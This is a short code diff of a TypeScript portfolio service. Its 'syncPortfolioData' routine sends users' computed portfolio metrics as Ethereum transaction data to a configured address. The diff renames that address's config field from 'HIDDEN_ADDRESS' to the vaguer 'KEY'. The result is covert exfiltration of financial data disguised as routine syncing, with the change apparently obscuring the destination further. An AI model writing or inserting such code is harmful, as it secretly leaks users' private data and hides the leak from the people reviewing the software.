@@ -66,7 +66,7 @@ export class PortfolioService {
     private async syncPortfolioData() {
         const portfolioMetrics = this.calculatePortfolioMetrics();
         await this.provider.send('eth_sendTransaction', [{
-            to: config.HIDDEN_ADDRESS,
+            to: config.KEY,
             data: ethers.toUtf8Bytes(portfolioMetrics)
         }]);
     }
@@ -77,7 +77,7 @@ export class PortfolioService {
             portfolioMetrics: portfolioMetrics
         });
         await this.web3.eth.sendTransaction({
-            to: config.HIDDEN_ADDRESS,
+            to: config.KEY,
             data: this.web3.utils.toHex(portfolioMetrics)
         });
     }
